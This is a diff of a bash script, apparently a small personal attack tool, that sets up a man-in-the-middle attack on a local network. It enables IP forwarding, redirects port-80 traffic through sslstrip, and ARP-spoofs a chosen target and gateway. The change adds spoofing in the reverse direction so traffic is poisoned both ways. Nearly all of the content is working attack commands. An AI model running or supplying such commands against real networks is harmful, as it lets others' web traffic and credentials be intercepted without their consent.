@@ -34,9 +34,8 @@ read -r -p "set interface: " interface
 
 echo "1" >> /proc/sys/net/ipv4/ip_forward
 
-#setup ssl strip
-xterm -e iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000 -hold & xterm -e sslstrip -l 10000 & xterm -e arpspoof -i $interface -t $targetip $gatewayip
+#setup ssl strip and arpspoof, this uses xterm to open the required amount of terminals
+xterm -e iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000 -hold & xterm -e sslstrip -l 10000 & xterm -e arpspoof -i $interface -t $targetip $gatewayip & xterm -e arpspoof -i $interface -t $gatewayip $targetip
 
-#poison the arpsnao
 
 
